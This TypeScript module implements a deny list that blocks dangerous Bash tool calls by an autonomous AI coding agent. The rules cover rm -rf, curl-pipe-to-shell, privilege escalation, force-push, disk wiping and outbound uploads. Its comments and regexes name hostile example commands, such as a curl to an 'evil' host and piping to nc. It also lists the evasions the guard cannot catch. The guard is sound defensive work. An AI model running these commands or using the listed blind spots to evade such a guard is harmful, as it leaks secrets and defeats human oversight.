/**
 * A safe default deny list for catastrophic tool calls, enforced through the
 * SDK's `PreToolUse` hook (see {@link HookBus}). The hook fires **regardless of
 * `permissionMode`** — including `bypassPermissions`, where `canUseTool` is never
 * consulted — so this is the one guardrail that bites under the studio's default
 * unattended config.
 *
 * SCOPE & LIMITS — read before extending. This is a *defense-in-depth heuristic*,
 * not a sandbox. Shell is adversarial: a determined prompt-injection can evade a
 * string matcher (base64-decode-then-exec, `$(printf …)`, exotic interpreters,
 * renamed binaries). The goal here is to stop the *obvious, irreversible or
 * exfiltrating* footguns — `rm -rf`, `sudo`, `curl | sh`, force-push, hard-reset,
 * disk wipes, and outbound data uploads (`curl -d @secret`, `… | nc host`) — that
 * account for the worst accidental blast radius, NOT to be a complete containment
 * boundary. Real containment is the workspace-trust gate + OS sandbox. Keep the
 * rule set tight and well-tested: every false positive blocks legitimate agent
 * work, so we deny only forms that are essentially never the right call inside an
 * autonomous coding run.
 *
 * EGRESS — what the `network-exfiltration` rule does and does NOT cover. It denies
 * the OBVIOUS Bash upload forms — `curl`/`wget` carrying a request body or upload
 * flag, a pipe/redirect into a raw socket (`nc`/`ncat`/`socat`, `>/dev/tcp/…`), and
 * `scp`/`sftp`/`rsync` to a remote host — because those are the "send local data
 * out" shapes and are ~never right in an autonomous coding run. It is DELIBERATELY
 * blind to: data smuggled inside a GET URL/query string (`curl https://evil/?x=$(…)`)
 * or hidden by encoding, since separating that from a legitimate fetch needs data-
 * flow analysis, not a string match; and any transfer via an SDK/MCP tool or a
 * renamed binary.
 *
 * This rule is the SHELL-level egress line only — it does NOT govern the native
 * `WebFetch`/`WebSearch` tools. Those are a separate egress channel, closed a
 * separate way: `resolveKindPreset` puts them in `disallowedTools` (which the SDK
 * enforces regardless of `permissionMode`, so it bites under `bypassPermissions`)
 * for every task kind EXCEPT the deliberately web-enabled `research` kind, and the
 * Insight/Harness scans deny them via `ANALYSIS_DISALLOWED_TOOLS`. So for the
 * default `build`/`tdd`/`review`/`decompose` kinds, WebFetch/WebSearch egress is
 * shut; `research` is the explicit per-task web opt-in (a future per-URL WebFetch
 * allowlist would narrow even that). The remaining gaps — in-URL GET exfil, MCP
 * writers, renamed binaries, a Bash read of a secret this gate can't parse — are
 * the job of the OS sandbox (the tiered-sandbox roadmap); the read side is further
 * narrowed by the sensitive-read guard in `workspace-confinement.ts`.
 */

/** The bash tool name the rules below inspect. */
export const BASH_TOOL = 'Bash';

/** The parsed shape a deny rule inspects. */
export interface CommandMatchContext {
  /** Every simple command in the line, each a token array, with quotes honored,
   *  surrounding quotes stripped, and leading `NAME=value` env-assignments
   *  removed. `a && rm -rf b` → `[['a'], ['rm', '-rf', 'b']]`. */
  commands: readonly (readonly string[])[];
  /** All tokens flattened across every simple command (for "appears anywhere"
   *  checks like an `rm` inside `find … -exec rm -rf {}`). */
  tokens: readonly string[];
  /** The original, unparsed command string (for whole-line regex checks like a
   *  download piped into a shell, where the pipe is the signal). */
  raw: string;
}

/**
 * One deny rule. `matches` receives the parsed command context and returns true
 * to BLOCK. A rule is intentionally conservative — it should fire only on a
 * clearly destructive form.
 */
export interface ToolDenyRule {
  /** Stable id for logging / telemetry. */
  id: string;
  /** Human-readable reason surfaced back to the agent on denial. */
  reason: string;
  /** Tool names this rule applies to. */
  tools: readonly string[];
  /** True ⇒ block. */
  matches: (ctx: CommandMatchContext) => boolean;
}

/** The result of evaluating a tool call against the policy. */
export interface ToolDenyVerdict {
  denied: boolean;
  ruleId?: string;
  reason?: string;
}

/** Basename of a command token: `/usr/bin/rm` → `rm`, `rm` → `rm`. Handles both
 *  `/` and `\` separators so a Windows-style path can't slip a denied binary
 *  past the basename check. */
function basename(token: string): string {
  const parts = token.split(/[\\/]/);
  return parts[parts.length - 1] ?? token;
}

/** True for a leading `NAME=value` environment assignment, which precedes the
 *  real command word (`FOO=bar rm -rf x`). */
function isEnvAssignment(token: string): boolean {
  return /^[A-Za-z_][A-Za-z0-9_]*=/.test(token);
}

/**
 * Quote-aware parse of a command line into its simple commands (token arrays).
 *
 * Honors single/double quotes so a quoted argument that merely CONTAINS a
 * dangerous string — `git commit -m "rm -rf is bad"` — stays a single token and
 * is never mistaken for the command itself. Splits into simple commands on
 * UNQUOTED shell operators (`; && || | & \n`). Strips surrounding quotes and
 * drops leading env-assignment prefixes per command.
 *
 * Deliberately NOT a full shell (no subshell `$( )`, backtick, or escape
 * handling): a heuristic gate, not an interpreter. See the module header.
 */
export function parseCommandLine(command: string): string[][] {
  const commands: string[][] = [];
  let current: string[] = [];
  let token = '';
  let tokenStarted = false; // distinguishes "" (quoted empty) from no token
  let quote: '"' | "'" | null = null;

  const endToken = (): void => {
    if (tokenStarted) {
      current.push(token);
      token = '';
      tokenStarted = false;
    }
  };
  const endCommand = (): void => {
    endToken();
    if (current.length > 0) commands.push(current);
    current = [];
  };

  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i]!;

    if (quote) {
      if (ch === quote) quote = null;
      else token += ch;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch;
      tokenStarted = true;
      continue;
    }

    // Unquoted shell control operators → command boundary.
    if (ch === ';' || ch === '\n') {
      endCommand();
      continue;
    }
    if (ch === '&') {
      endCommand();
      if (command[i + 1] === '&') i += 1; // consume the second '&' of '&&'
      continue;
    }
    if (ch === '|') {
      endCommand();
      if (command[i + 1] === '|') i += 1; // consume the second '|' of '||'
      continue;
    }

    if (ch === ' ' || ch === '\t' || ch === '\r') {
      endToken();
      continue;
    }

    token += ch;
    tokenStarted = true;
  }
  endCommand();

  // Drop leading env-assignment prefixes so each command's word is exposed.
  return commands.map((cmd) => {
    let start = 0;
    while (start < cmd.length && isEnvAssignment(cmd[start]!)) start += 1;
    return cmd.slice(start);
  });
}

/** Flattened token list across every simple command. */
export function tokenizeCommand(command: string): string[] {
  return parseCommandLine(command).flat();
}

/** Collect the flags that immediately follow an `rm` token (until a non-flag
 *  operand), lowercased and joined, so `-rf`, `-fr`, `-r -f`, and
 *  `--recursive --force` all surface their letters/words. */
function rmFlagsAfter(tokens: readonly string[], rmIndex: number): string {
  const flags: string[] = [];
  for (let i = rmIndex + 1; i < tokens.length; i += 1) {
    const t = tokens[i]!;
    if (t.startsWith('-')) flags.push(t.toLowerCase());
    else break;
  }
  return flags.join(' ');
}

/** True if an `rm` token carries BOTH a recursive and a force flag — the
 *  irreversible form. Scans every `rm` token (not just a command word) so
 *  `find … -exec rm -rf {}` and `xargs rm -rf` are caught too. */
function hasDestructiveRm(tokens: readonly string[]): boolean {
  for (let i = 0; i < tokens.length; i += 1) {
    if (basename(tokens[i]!) !== 'rm') continue;
    const flags = rmFlagsAfter(tokens, i);
    const recursive = /--recursive(\s|$)/.test(flags) || /-\w*r/.test(flags);
    const force = /--force(\s|$)/.test(flags) || /-\w*f/.test(flags);
    if (recursive && force) return true;
  }
  return false;
}

const PRIVILEGE_WORDS = new Set(['sudo', 'doas', 'su', 'pkexec']);

/** True if any simple command's COMMAND WORD (first token) is a
 *  privilege-escalation binary. */
function isPrivilegeEscalation(commands: readonly (readonly string[])[]): boolean {
  return commands.some(
    (cmd) => cmd.length > 0 && PRIVILEGE_WORDS.has(basename(cmd[0]!)),
  );
}

/** True if a single command is a `git … push …` with a plain force flag
 *  (`-f` / `--force`), excluding the safer `--force-with-lease`. */
function isForcePush(cmd: readonly string[]): boolean {
  const isGit = cmd.some((t) => basename(t) === 'git');
  if (!isGit || !cmd.includes('push')) return false;
  if (cmd.includes('--force-with-lease')) return false;
  return cmd.some((t) => t === '--force' || t === '-f');
}

/** True if a single command is a `git … reset --hard …`. */
function isHardReset(cmd: readonly string[]): boolean {
  const isGit = cmd.some((t) => basename(t) === 'git');
  return isGit && cmd.includes('reset') && cmd.includes('--hard');
}

/** True for piping a network download straight into an interpreter
 *  (`curl … | sh`, `wget … | bash`, `… | sudo bash`). Matched on the RAW line
 *  because the pipe is the signal. */
function isPipeToShell(raw: string): boolean {
  return /\b(?:curl|wget|fetch)\b[^\n|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|ksh|dash|fish|python3?|perl|ruby|node)\b/i.test(
    raw,
  );
}

/** True for a disk-destroying command in a single simple command (`mkfs*`,
 *  `wipefs`, `dd of=/dev/…`) or a redirect into a block device on the raw line.
 *  Never a legitimate move inside a coding run. */
function isDiskDestroy(cmd: readonly string[]): boolean {
  const mkfs = cmd.some((t) => basename(t).startsWith('mkfs'));
  const wipefs = cmd.some((t) => basename(t) === 'wipefs');
  const ddToDevice =
    cmd.some((t) => basename(t) === 'dd') &&
    cmd.some((t) => /^of=\/dev\//.test(t));
  return mkfs || wipefs || ddToDevice;
}

/** Redirect into a raw block device (`> /dev/sda`), checked on the raw line so
 *  the redirect operator survives. */
function redirectsToDevice(raw: string): boolean {
  return /[>]\s*\/dev\/(?:sd|nvme|disk|vd|hd|mmcblk)/i.test(raw);
}

/** curl LONG flags that carry an outbound request body / uploaded file
 *  (`--data*`, `--form*`, `--upload-file`, `--json`), value glued or spaced. */
const CURL_UPLOAD_LONG_FLAG =
  /^--(?:data(?:-[a-z]+)?|form(?:-string)?|upload(?:-file)?|json)(?:=|$)/;

/** HTTP methods with a request body / mutating intent (an explicit `-X POST`
 *  is the finding's exact exfil shape even before the `-d` payload). */
const MUTATING_METHOD = /^(?:POST|PUT|PATCH|DELETE)$/i;

/** A curl SHORT-flag token that carries body/upload data: a single-dash group
 *  containing `d` (`--data`), `F` (`--form`), or `T` (`--upload-file`) — incl. a
 *  glued value like `-d@file`. Case-sensitive on purpose: uppercase `-D`
 *  (dump-header, a RESPONSE write) and download flags (`-O`/`-o`/`-fsSL`/`-I`)
 *  carry none of `d`/`F`/`T`, so a plain fetch never matches. */
function isCurlDataShortFlag(token: string): boolean {
  return token.startsWith('-') && !token.startsWith('--') && /[dFT]/.test(token);
}

/** True for a `curl` command that SENDS a body — a data/form/upload/`--json`
 *  flag, or an explicit mutating `-X`/`--request` method (incl. glued `-XPOST`).
 *  A download (`curl -fsSL url -o file`, `curl -I url`) carries none of these. */
function isCurlUpload(cmd: readonly string[]): boolean {
  if (cmd.length === 0 || basename(cmd[0]!) !== 'curl') return false;
  for (let i = 0; i < cmd.length; i += 1) {
    const t = cmd[i]!;
    if (CURL_UPLOAD_LONG_FLAG.test(t) || isCurlDataShortFlag(t)) return true;
    if ((t === '-X' || t === '--request') && MUTATING_METHOD.test(cmd[i + 1] ?? ''))
      return true;
    const glued = /^(?:-X|--request=)(.+)$/.exec(t);
    if (glued && MUTATING_METHOD.test(glued[1]!)) return true;
  }
  return false;
}

/** wget flags that POST a body / upload a file (`--post-data`, `--post-file`,
 *  `--body-data`, `--body-file`), value glued or spaced. */
const WGET_UPLOAD_LONG_FLAG = /^--(?:post-(?:data|file)|body-(?:data|file))(?:=|$)/;

/** True for a `wget` command that SENDS a body (a `--post-*`/`--body-*` flag or a
 *  mutating `--method`). A plain `wget url` download carries none of these. */
function isWgetUpload(cmd: readonly string[]): boolean {
  if (cmd.length === 0 || basename(cmd[0]!) !== 'wget') return false;
  return cmd.some((t, i) => {
    if (WGET_UPLOAD_LONG_FLAG.test(t)) return true;
    if (t === '--method') return MUTATING_METHOD.test(cmd[i + 1] ?? '');
    const glued = /^--method=(.+)$/.exec(t);
    return glued !== null && MUTATING_METHOD.test(glued[1]!);
  });
}

/** Tools that copy local files to another host. */
const REMOTE_COPY_TOOLS = new Set(['scp', 'sftp', 'rsync']);

/** A remote transfer target: `[user@]host:path` (the scp/rsync colon form) or an
 *  explicit remote URL scheme (`rsync://`, `ssh://`, `scp://`, `sftp://`). Kept
 *  narrow — a bare `host:path` without `@` is too easily a false hit, so we only
 *  match the `user@host:` and scheme forms. */
const REMOTE_TARGET = /^(?:[\w.-]+@[\w.-]+:|(?:rsync|ssh|scp|sftp):\/\/)/i;

/** True for `scp`/`sftp`/`rsync` sending to a REMOTE host — exfiltration of local
 *  files. A purely local `rsync a/ b/` (no remote token) never matches. */
function isRemoteCopy(cmd: readonly string[]): boolean {
  if (cmd.length === 0 || !REMOTE_COPY_TOOLS.has(basename(cmd[0]!))) return false;
  return cmd.slice(1).some((t) => REMOTE_TARGET.test(t));
}

/** Raw-line socket-exfil forms the token parser can't see because the SIGNAL is a
 *  pipe/redirect the parser splits on: piping data INTO a raw-socket tool, feeding
 *  a file INTO one, or writing to a bash `/dev/tcp|udp/` pseudo-device. Matched on
 *  the raw line, like the `curl|sh` pipe rule. `nc … > file` (RECEIVING) is left
 *  alone — only the send direction (`|`, `<`, `>/dev/tcp`) is exfil. */
function isSocketExfil(raw: string): boolean {
  return (
    /\|\s*(?:nc|ncat|netcat|socat)\b/i.test(raw) ||
    /\b(?:nc|ncat|netcat|socat)\b[^\n|]*<\s*\S/i.test(raw) ||
    /[>]\s*\/dev\/(?:tcp|udp)\//i.test(raw)
  );
}

/** True for an outbound data transfer that could exfiltrate local secrets — a
 *  curl/wget upload, a raw-socket send, or a remote scp/sftp/rsync. See the module
 *  header for the deliberate blind spots (in-URL GET exfil, WebFetch, encodings). */
function isNetworkExfiltration(ctx: CommandMatchContext): boolean {
  if (isSocketExfil(ctx.raw)) return true;
  return ctx.commands.some(
    (cmd) => isCurlUpload(cmd) || isWgetUpload(cmd) || isRemoteCopy(cmd),
  );
}

/**
 * The studio's safe default destructive-command deny set. Tight by design (see
 * the module header): each rule blocks a form that is essentially never the right
 * call in an autonomous coding run, and is independently unit-tested. Order
 * matters only for which `ruleId` is reported when a command matches several;
 * the more descriptive rule (e.g. pipe-to-shell over the incidental `sudo`) wins.
 */
export const DEFAULT_DESTRUCTIVE_RULES: readonly ToolDenyRule[] = [
  {
    id: 'rm-recursive-force',
    reason:
      'Blocked by Nightcore safety policy: recursive force-delete (rm -rf) is irreversible. Delete specific paths without -rf, or ask the user.',
    tools: [BASH_TOOL],
    matches: (ctx) => hasDestructiveRm(ctx.tokens),
  },
  {
    id: 'pipe-to-shell',
    reason:
      'Blocked by Nightcore safety policy: piping a network download into a shell (curl|sh) executes unreviewed remote code. Download, inspect, then run.',
    tools: [BASH_TOOL],
    matches: (ctx) => isPipeToShell(ctx.raw),
  },
  {
    id: 'network-exfiltration',
    reason:
      'Blocked by Nightcore safety policy: this looks like an outbound data transfer (uploading local data to a remote host via curl/wget, a raw socket, or scp/rsync), which could exfiltrate secrets from this machine. Fetch-only requests are fine; to SEND data externally, ask the user.',
    tools: [BASH_TOOL],
    matches: isNetworkExfiltration,
  },
  {
    id: 'privilege-escalation',
    reason:
      'Blocked by Nightcore safety policy: privilege escalation (sudo/su/doas/pkexec) is not permitted in an autonomous run.',
    tools: [BASH_TOOL],
    matches: (ctx) => isPrivilegeEscalation(ctx.commands),
  },
  {
    id: 'git-force-push',
    reason:
      'Blocked by Nightcore safety policy: force-push rewrites remote history. Use --force-with-lease only with explicit user approval.',
    tools: [BASH_TOOL],
    matches: (ctx) => ctx.commands.some(isForcePush),
  },
  {
    id: 'git-reset-hard',
    reason:
      'Blocked by Nightcore safety policy: git reset --hard discards uncommitted work irreversibly. Use git restore/checkout for specific paths.',
    tools: [BASH_TOOL],
    matches: (ctx) => ctx.commands.some(isHardReset),
  },
  {
    id: 'disk-destroy',
    reason:
      'Blocked by Nightcore safety policy: writing to a raw block device or creating a filesystem (mkfs/dd of=/dev/…) destroys data.',
    tools: [BASH_TOOL],
    matches: (ctx) => ctx.commands.some(isDiskDestroy) || redirectsToDevice(ctx.raw),
  },
];

/**
 * Extract the bash command string from a `PreToolUse` `tool_input`, or undefined
 * when the tool carries no inspectable command. Defensive: `tool_input` is
 * `unknown` at the SDK boundary.
 */
function bashCommandOf(toolInput: unknown): string | undefined {
  if (toolInput === null || typeof toolInput !== 'object') return undefined;
  const command = (toolInput as { command?: unknown }).command;
  return typeof command === 'string' ? command : undefined;
}

/**
 * Evaluate a single tool call against the deny policy. Returns `{ denied: false }`
 * for any tool/input the rules don't cover (the common path) so the caller can
 * fall through to its normal allow. Only `Bash` calls with a string `command`
 * are inspected today.
 */
export function evaluateToolDeny(
  toolName: string,
  toolInput: unknown,
  rules: readonly ToolDenyRule[] = DEFAULT_DESTRUCTIVE_RULES,
): ToolDenyVerdict {
  if (toolName !== BASH_TOOL) return { denied: false };
  const raw = bashCommandOf(toolInput);
  if (raw === undefined || raw.trim().length === 0) return { denied: false };

  const commands = parseCommandLine(raw);
  const ctx: CommandMatchContext = { commands, tokens: commands.flat(), raw };
  for (const rule of rules) {
    if (!rule.tools.includes(toolName)) continue;
    if (rule.matches(ctx)) {
      return { denied: true, ruleId: rule.id, reason: rule.reason };
    }
  }
  return { denied: false };
}
